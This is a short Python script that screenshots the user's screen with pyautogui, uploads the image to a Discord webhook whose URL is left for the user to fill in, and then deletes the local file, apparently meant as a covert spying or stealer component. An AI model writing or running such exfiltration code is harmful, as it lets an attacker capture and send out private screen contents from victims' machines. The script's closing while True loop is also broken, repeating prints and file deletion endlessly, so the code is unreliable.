#! /usr/bin/python
import pyautogui
import time 
import os
import requests

# delay for obvious reason remove if you want ig 
time.sleep(1) #adapt to your liking im not stopping you (yet)
# Path where the screenshot will be saved for when it is sent to your webhook
screenshot_path = "screenshot.png"

# Take the screenshot
screenshot = pyautogui.screenshot()
screenshot.save(screenshot_path)  # Save screenshot to file

# [ replace with your actual webhook URL ]
webhook_url = ""

#sends the screenshot to the Discord webhook
with open(screenshot_path, "rb") as file:
    payload = {
        'content': 'Here is the screenshot!'
    }
    files = {
        'file': (screenshot_path, file, 'image/png')
    }
    response = requests.post(webhook_url, data=payload, files=files)

# response status
while True:
    if response.status_code == 204:
     print("[+] Screenshot sent successfully!")
    else:
       print(f"[-] Failed to send screenshot: {response.status_code}")

# removes the scree shot after it sending to avoid storage being taken 
    os.remove(screenshot_path)
